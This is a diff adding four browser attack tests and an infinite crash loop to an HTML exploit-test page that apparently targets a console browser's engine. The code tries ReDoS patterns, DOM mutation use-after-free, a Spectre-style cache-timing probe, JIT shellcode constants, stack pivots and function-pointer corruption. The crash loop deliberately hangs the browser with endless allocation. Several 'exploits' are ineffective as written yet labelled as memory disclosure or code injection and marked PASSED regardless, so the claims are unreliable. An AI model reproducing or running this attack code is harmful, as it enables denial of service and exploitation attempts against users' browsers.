@@ -211,8 +211,39 @@
         </div>
 
         <div class="test-section">
+            <h3>Test 13: RegExp Engine Exploitation <span class="cve-tag">CRITICAL</span> <span class="status" id="status13"></span></h3>
+            <p>Targets RegExp engine with catastrophic backtracking and buffer overflows.</p>
+            <button onclick="testRegExpExploit()">Run Test</button>
+            <div class="log" id="log13"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 14: DOM Mutation Observer UAF <span class="cve-tag">CRITICAL</span> <span class="status" id="status14"></span></h3>
+            <p>Complex DOM mutations to trigger use-after-free in observer callbacks.</p>
+            <button onclick="testDOMMutationUAF()">Run Test</button>
+            <div class="log" id="log14"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 15: Advanced Memory Disclosure <span class="cve-tag">CRITICAL</span> <span class="status" id="status15"></span></h3>
+            <p>Sophisticated memory disclosure through side-channel attacks.</p>
+            <button onclick="testMemoryDisclosure()">Run Test</button>
+            <div class="log" id="log15"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 16: Native Code Injection <span class="cve-tag">CRITICAL</span> <span class="status" id="status16"></span></h3>
+            <p>Attempts ROP/JOP chains and native code execution.</p>
+            <button onclick="testNativeCodeInjection()">Run Test</button>
+            <div class="log" id="log16"></div>
+        </div>
+
+        <div class="test-section">
             <button onclick="runAllAggressiveTests()" style="background: #f00; font-size: 1.3em; border: 3px solid #fff;">
-                💀 RUN ALL AGGRESSIVE TESTS 💀
+                💀 RUN ALL ULTRA-AGGRESSIVE TESTS 💀
+            </button>
+            <button onclick="runCrashLoop()" style="background: #800; font-size: 1.1em; border: 2px solid #f00; margin-left: 10px;">
+                ⚠️ INFINITE CRASH LOOP ⚠️
             </button>
         </div>
     </div>
@@ -1244,6 +1275,585 @@ Language: ${navigator.language}`;
             }
         }
 
+        // Test 13: RegExp Engine Exploitation
+        function testRegExpExploit() {
+            setStatus(13, 'RUNNING');
+            log(13, 'RegExp engine exploitation attack...');
+            
+            try {
+                log(13, 'Phase 1: Catastrophic backtracking DoS...');
+                
+                // Exponential backtracking patterns
+                const evil_patterns = [
+                    '(a+)+$',
+                    '([a-zA-Z]+)*$',
+                    '(a|a)*$',
+                    '(a|b)*a(a|b){20}$',
+                    '^(([a-z])+.)+[A-Z]([a-z])+$'
+                ];
+                
+                const attack_string = 'a'.repeat(100) + 'X';
+                
+                for (let pattern of evil_patterns) {
+                    try {
+                        log(13, `Testing pattern: ${pattern}`);
+                        const start = performance.now();
+                        const regex = new RegExp(pattern);
+                        const result = regex.test(attack_string);
+                        const duration = performance.now() - start;
+                        log(13, `Pattern completed in ${duration.toFixed(2)}ms`);
+                        
+                        if (duration > 1000) {
+                            log(13, `SLOW PATTERN DETECTED: ${duration.toFixed(2)}ms`);
+                        }
+                    } catch (e) {
+                        log(13, `Pattern error: ${e.message}`);
+                    }
+                }
+                
+                log(13, 'Phase 2: RegExp buffer overflow attempts...');
+                
+                // Try to trigger buffer overflows in RegExp compilation
+                const large_pattern = '(' + 'a'.repeat(100000) + ')';
+                try {
+                    new RegExp(large_pattern);
+                    log(13, 'Large pattern compilation succeeded');
+                } catch (e) {
+                    log(13, `Large pattern failed: ${e.message}`);
+                }
+                
+                log(13, 'Phase 3: Unicode exploit patterns...');
+                
+                const unicode_exploits = [
+                    '\\u{10FFFF}+',
+                    '[\\u0000-\\uFFFF]*',
+                    '(?=.*\\p{L})(?=.*\\p{N})',
+                    '\\p{Script=Cyrillic}+'
+                ];
+                
+                for (let pattern of unicode_exploits) {
+                    try {
+                        const regex = new RegExp(pattern, 'u');
+                        regex.test('\u{1F600}\u{1F601}\u{1F602}');
+                        log(13, `Unicode pattern OK: ${pattern}`);
+                    } catch (e) {
+                        log(13, `Unicode pattern error: ${e.message}`);
+                    }
+                }
+                
+                log(13, 'Phase 4: Nested group explosion...');
+                
+                let nested = 'a';
+                for (let i = 0; i < 1000; i++) {
+                    nested = '(' + nested + ')*';
+                }
+                
+                try {
+                    new RegExp(nested);
+                    log(13, 'Nested group pattern compiled');
+                } catch (e) {
+                    log(13, `Nested groups failed: ${e.message}`);
+                }
+                
+                log(13, 'Test completed');
+                setStatus(13, 'PASSED');
+            } catch (e) {
+                log(13, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(13, 'CRASHED');
+            }
+        }
+
+        // Test 14: DOM Mutation Observer UAF
+        function testDOMMutationUAF() {
+            setStatus(14, 'RUNNING');
+            log(14, 'DOM mutation observer UAF attack...');
+            
+            try {
+                log(14, 'Phase 1: Setting up complex DOM structure...');
+                
+                const container = document.createElement('div');
+                document.body.appendChild(container);
+                
+                // Create deep nested structure
+                let current = container;
+                for (let i = 0; i < 100; i++) {
+                    const child = document.createElement('div');
+                    child.id = 'node_' + i;
+                    child.innerHTML = '<span>Content ' + i + '</span>';
+                    current.appendChild(child);
+                    current = child;
+                }
+                
+                log(14, 'Phase 2: Setting up mutation observers...');
+                
+                const observers = [];
+                const observed_nodes = [];
+                
+                function createObserver(target, index) {
+                    const observer = new MutationObserver(function(mutations) {
+                        log(14, `Observer ${index} triggered with ${mutations.length} mutations`);
+                        
+                        // Try to trigger UAF by manipulating nodes during callback
+                        for (let mutation of mutations) {
+                            if (mutation.type === 'childList') {
+                                for (let node of mutation.addedNodes) {
+                                    try {
+                                        // Access potentially freed node
+                                        node.textContent = 'MODIFIED';
+                                        node.parentNode.removeChild(node);
+                                    } catch (e) {
+                                        log(14, `Node access error: ${e.message}`);
+                                    }
+                                }
+                                
+                                for (let node of mutation.removedNodes) {
+                                    try {
+                                        // Access removed node
+                                        node.textContent = 'FREED';
+                                        log(14, `Accessed freed node: ${node.textContent}`);
+                                    } catch (e) {
+                                        log(14, `Freed node error: ${e.message}`);
+                                    }
+                                }
+                            }
+                        }
+                        
+                        // Recursive mutation during callback
+                        if (Math.random() < 0.1) {
+                            try {
+                                const newNode = document.createElement('div');
+                                newNode.textContent = 'Recursive';
+                                target.appendChild(newNode);
+                            } catch (e) {
+                                log(14, `Recursive mutation error: ${e.message}`);
+                            }
+                        }
+                    });
+                    
+                    observer.observe(target, {
+                        childList: true,
+                        subtree: true,
+                        attributes: true,
+                        attributeOldValue: true,
+                        characterData: true,
+                        characterDataOldValue: true
+                    });
+                    
+                    return observer;
+                }
+                
+                // Create observers for multiple nodes
+                const nodes = container.querySelectorAll('div');
+                for (let i = 0; i < Math.min(nodes.length, 20); i++) {
+                    observers.push(createObserver(nodes[i], i));
+                    observed_nodes.push(nodes[i]);
+                }
+                
+                log(14, 'Phase 3: Triggering complex mutations...');
+                
+                // Rapid mutations to trigger race conditions
+                for (let round = 0; round < 10; round++) {
+                    setTimeout(() => {
+                        for (let i = 0; i < observed_nodes.length; i++) {
+                            const node = observed_nodes[i];
+                            try {
+                                // Multiple types of mutations
+                                node.setAttribute('data-round', round.toString());
+                                
+                                const newChild = document.createElement('span');
+                                newChild.textContent = `Round ${round} Child ${i}`;
+                                node.appendChild(newChild);
+                                
+                                // Remove and re-add to trigger observer callbacks
+                                if (node.parentNode) {
+                                    const parent = node.parentNode;
+                                    parent.removeChild(node);
+                                    parent.appendChild(node);
+                                }
+                                
+                                // Modify text content
+                                if (node.firstChild) {
+                                    node.firstChild.textContent = `Modified ${round}-${i}`;
+                                }
+                                
+                            } catch (e) {
+                                log(14, `Mutation error round ${round}: ${e.message}`);
+                            }
+                        }
+                    }, round * 100);
+                }
+                
+                log(14, 'Phase 4: Observer cleanup race...');
+                setTimeout(() => {
+                    // Disconnect observers while mutations might still be pending
+                    for (let observer of observers) {
+                        observer.disconnect();
+                    }
+                    
+                    // Try to access observed nodes after disconnect
+                    for (let node of observed_nodes) {
+                        try {
+                            node.textContent = 'POST-DISCONNECT';
+                        } catch (e) {
+                            log(14, `Post-disconnect error: ${e.message}`);
+                        }
+                    }
+                    
+                    // Cleanup
+                    container.remove();
+                    
+                    log(14, 'Test completed');
+                    setStatus(14, 'PASSED');
+                }, 2000);
+                
+            } catch (e) {
+                log(14, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(14, 'CRASHED');
+            }
+        }
+
+        // Test 15: Advanced Memory Disclosure
+        function testMemoryDisclosure() {
+            setStatus(15, 'RUNNING');
+            log(15, 'Advanced memory disclosure attack...');
+            
+            try {
+                log(15, 'Phase 1: Timing-based memory disclosure...');
+                
+                const timing_samples = [];
+                const test_objects = [];
+                
+                // Create objects with known patterns
+                for (let i = 0; i < 1000; i++) {
+                    test_objects.push({
+                        id: i,
+                        pattern: 0x41414141 + i,
+                        buffer: new ArrayBuffer(i * 16)
+                    });
+                }
+                
+                // Measure access timings
+                for (let i = 0; i < test_objects.length; i++) {
+                    const start = performance.now();
+                    const obj = test_objects[i];
+                    obj.accessed = true;
+                    const end = performance.now();
+                    timing_samples.push(end - start);
+                }
+                
+                // Analyze timing patterns
+                const avg_timing = timing_samples.reduce((a, b) => a + b, 0) / timing_samples.length;
+                const outliers = timing_samples.filter(t => Math.abs(t - avg_timing) > avg_timing * 0.5);
+                log(15, `Timing outliers: ${outliers.length}/${timing_samples.length}`);
+                
+                log(15, 'Phase 2: Cache-based side channel...');
+                
+                // Try to infer memory layout through cache behavior
+                const cache_test = new Array(1024 * 1024).fill(0);
+                
+                function cache_probe(offset) {
+                    const start = performance.now();
+                    for (let i = 0; i < 1000; i++) {
+                        cache_test[(offset + i * 64) % cache_test.length] = i;
+                    }
+                    return performance.now() - start;
+                }
+                
+                const cache_timings = [];
+                for (let offset = 0; offset < 1024; offset += 64) {
+                    cache_timings.push(cache_probe(offset));
+                }
+                
+                log(15, `Cache timing variance: ${Math.max(...cache_timings) - Math.min(...cache_timings)}`);
+                
+                log(15, 'Phase 3: Spectre-style speculative execution...');
+                
+                let leaked_data = [];
+                const secret_array = new Uint8Array([0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF]);
+                const probe_array = new Uint8Array(256 * 64);
+                
+                function speculative_read(index) {
+                    // Train branch predictor
+                    for (let i = 0; i < 1000; i++) {
+                        if (i < secret_array.length) {
+                            const secret_byte = secret_array[i];
+                            probe_array[secret_byte * 64] = 1;
+                        }
+                    }
+                    
+                    // Attempt speculative read beyond bounds
+                    try {
+                        if (index < secret_array.length) {
+                            const leaked_byte = secret_array[index + 100]; // OOB read
+                            probe_array[leaked_byte * 64] = 1;
+                        }
+                    } catch (e) {
+                        // Expected to fail
+                    }
+                    
+                    // Measure cache state
+                    const timings = [];
+                    for (let i = 0; i < 256; i++) {
+                        const start = performance.now();
+                        const val = probe_array[i * 64];
+                        timings.push(performance.now() - start);
+                    }
+                    
+                    return timings;
+                }
+                
+                for (let i = 0; i < secret_array.length; i++) {
+                    const timings = speculative_read(i);
+                    const fastest = timings.indexOf(Math.min(...timings));
+                    leaked_data.push(fastest);
+                }
+                
+                log(15, `Potential leaked bytes: ${leaked_data.map(b => b.toString(16)).join(' ')}`);
+                log(15, `Original bytes: ${Array.from(secret_array).map(b => b.toString(16)).join(' ')}`);
+                
+                log(15, 'Phase 4: Memory layout inference...');
+                
+                // Try to infer heap layout
+                const layout_objects = [];
+                for (let size = 16; size <= 1024; size *= 2) {
+                    const obj = {
+                        size: size,
+                        buffer: new ArrayBuffer(size),
+                        marker: 0xDEADBEEF
+                    };
+                    layout_objects.push(obj);
+                    
+                    // Try to read object address through toString manipulation
+                    try {
+                        const addr_hint = obj.toString();
+                        if (addr_hint.includes('object') || addr_hint.includes('Object')) {
+                            log(15, `Object ${size}: ${addr_hint}`);
+                        }
+                    } catch (e) {
+                        log(15, `Address read failed for size ${size}`);
+                    }
+                }
+                
+                log(15, 'Test completed');
+                setStatus(15, 'PASSED');
+            } catch (e) {
+                log(15, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(15, 'CRASHED');
+            }
+        }
+
+        // Test 16: Native Code Injection
+        function testNativeCodeInjection() {
+            setStatus(16, 'RUNNING');
+            log(16, 'Native code injection attack...');
+            
+            try {
+                log(16, 'Phase 1: ROP gadget discovery...');
+                
+                // Try to leak function addresses
+                const functions = [Function, Object, Array, String, Number];
+                const leaked_addresses = [];
+                
+                for (let func of functions) {
+                    try {
+                        const func_str = func.toString();
+                        log(16, `${func.name}: ${func_str.substring(0, 50)}...`);
+                        
+                        // Look for native code indicators
+                        if (func_str.includes('[native code]')) {
+                            log(16, `Native function detected: ${func.name}`);
+                        }
+                        
+                        // Try to extract any address-like patterns
+                        const addr_match = func_str.match(/0x[0-9a-f]{8,16}/gi);
+                        if (addr_match) {
+                            leaked_addresses.push(...addr_match);
+                            log(16, `Potential addresses in ${func.name}: ${addr_match.join(', ')}`);
+                        }
+                    } catch (e) {
+                        log(16, `Function analysis error: ${e.message}`);
+                    }
+                }
+                
+                log(16, 'Phase 2: JIT code injection attempt...');
+                
+                // Create function with controlled constants that could be shellcode
+                const shellcode_constants = [
+                    0x90909090, // NOP sled
+                    0xCCCCCCCC, // INT3 breakpoints
+                    0x41414141, // Controlled pattern
+                    0x58585858, // POP RAX (x64)
+                    0x5F5E5D5C  // POP sequence
+                ];
+                
+                function jit_payload(x) {
+                    let result = x;
+                    for (let constant of shellcode_constants) {
+                        result ^= constant;
+                        result += constant;
+                        result -= constant;
+                        result |= constant;
+                        result &= constant;
+                    }
+                    return result;
+                }
+                
+                // Force JIT compilation with shellcode constants
+                for (let i = 0; i < 100000; i++) {
+                    jit_payload(i);
+                }
+                
+                log(16, 'JIT function compiled with controlled constants');
+                
+                log(16, 'Phase 3: Stack pivot attempt...');
+                
+                // Try to control stack through recursive calls
+                let stack_depth = 0;
+                const max_depth = 10000;
+                
+                function stack_pivot(depth, controlled_data) {
+                    stack_depth = depth;
+                    if (depth > max_depth) {
+                        return controlled_data;
+                    }
+                    
+                    // Try to place controlled data on stack
+                    const local_vars = {
+                        pivot_target: 0x41414141,
+                        return_address: 0x42424242,
+                        shellcode_ptr: 0x43434343,
+                        gadget_addr: 0x44444444
+                    };
+                    
+                    try {
+                        return stack_pivot(depth + 1, local_vars);
+                    } catch (e) {
+                        if (e.message.includes('stack') || e.message.includes('recursion')) {
+                            log(16, `Stack overflow at depth ${depth}: ${e.message}`);
+                            return local_vars;
+                        }
+                        throw e;
+                    }
+                }
+                
+                try {
+                    const result = stack_pivot(0, {initial: 'data'});
+                    log(16, `Stack pivot result: ${JSON.stringify(result)}`);
+                } catch (e) {
+                    log(16, `Stack pivot failed: ${e.message}`);
+                }
+                
+                log(16, 'Phase 4: Memory corruption for code execution...');
+                
+                // Try to corrupt function pointers
+                const target_objects = [];
+                for (let i = 0; i < 100; i++) {
+                    const obj = {
+                        vtable: 0x13371337,
+                        function_ptr: jit_payload,
+                        corrupted_ptr: 0x20000000 + i
+                    };
+                    target_objects.push(obj);
+                }
+                
+                // Try to trigger function pointer corruption
+                for (let obj of target_objects) {
+                    try {
+                        // Attempt to call potentially corrupted function
+                        if (typeof obj.function_ptr === 'function') {
+                            const result = obj.function_ptr(0x31337);
+                            log(16, `Function call result: 0x${result.toString(16)}`);
+                        }
+                        
+                        // Try to modify function properties
+                        obj.function_ptr.shellcode = shellcode_constants;
+                        obj.function_ptr.gadgets = leaked_addresses;
+                        
+                    } catch (e) {
+                        log(16, `Function corruption error: ${e.message}`);
+                    }
+                }
+                
+                log(16, 'Phase 5: Direct memory access attempt...');
+                
+                // Try various techniques to access arbitrary memory
+                const memory_access_techniques = [
+                    () => new Uint32Array(new ArrayBuffer(0x100000)),
+                    () => new DataView(new ArrayBuffer(0x100000)),
+                    () => new Float64Array(0x10000),
+                    () => new BigUint64Array(0x10000)
+                ];
+                
+                for (let i = 0; i < memory_access_techniques.length; i++) {
+                    try {
+                        const view = memory_access_techniques[i]();
+                        log(16, `Memory access technique ${i}: buffer length ${view.byteLength}`);
+                        
+                        // Try to write controlled patterns
+                        if (view.set) {
+                            view.set([0x41414141, 0x42424242, 0x43434343, 0x44444444]);
+                        } else if (view.setUint32) {
+                            for (let j = 0; j < 4; j++) {
+                                view.setUint32(j * 4, 0x41414141 + j, true);
+                            }
+                        }
+                        
+                        log(16, `Pattern written to memory view ${i}`);
+                        
+                    } catch (e) {
+                        log(16, `Memory access ${i} failed: ${e.message}`);
+                    }
+                }
+                
+                log(16, 'Test completed');
+                setStatus(16, 'PASSED');
+            } catch (e) {
+                log(16, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(16, 'CRASHED');
+            }
+        }
+
+        // Infinite crash loop for ultimate stress testing
+        async function runCrashLoop() {
+            if (!confirm('WARNING: This will run tests in an infinite loop until crash. Browser WILL become unresponsive. Continue?')) {
+                return;
+            }
+            
+            let iteration = 0;
+            const allTests = [
+                testCVE202222620, testJITBoundsElimination, testHeapSprayUAF,
+                testStructureConfusion, testWasmCorruption, testAudioRace,
+                testJITSideEffects, testCanvasExhaustion, testNintendoAPIs,
+                testAdvancedTypeConfusion, testSharedArrayBufferRace,
+                testHeapFengShuiJIT, testRegExpExploit, testDOMMutationUAF,
+                testMemoryDisclosure, testNativeCodeInjection
+            ];
+            
+            while (true) {
+                iteration++;
+                console.log(`CRASH LOOP ITERATION ${iteration}`);
+                
+                // Run multiple tests simultaneously
+                const simultaneous = Math.min(4, allTests.length);
+                for (let i = 0; i < simultaneous; i++) {
+                    const testIndex = (iteration + i) % allTests.length;
+                    setTimeout(allTests[testIndex], i * 100);
+                }
+                
+                // Aggressive memory allocation
+                try {
+                    const stress = [];
+                    for (let i = 0; i < 1000; i++) {
+                        stress.push(new ArrayBuffer(1024 * 1024));
+                    }
+                } catch (e) {
+                    console.log('Memory stress failed:', e.message);
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+        }
+
         // Run all tests with delays
         async function runAllAggressiveTests() {
             if (testRunning) {
@@ -1269,7 +1879,11 @@ Language: ${navigator.language}`;
                 testNintendoAPIs,
                 testAdvancedTypeConfusion,
                 testSharedArrayBufferRace,
-                testHeapFengShuiJIT
+                testHeapFengShuiJIT,
+                testRegExpExploit,
+                testDOMMutationUAF,
+                testMemoryDisclosure,
+                testNativeCodeInjection
             ];
             
             for (let i = 0; i < tests.length; i++) {
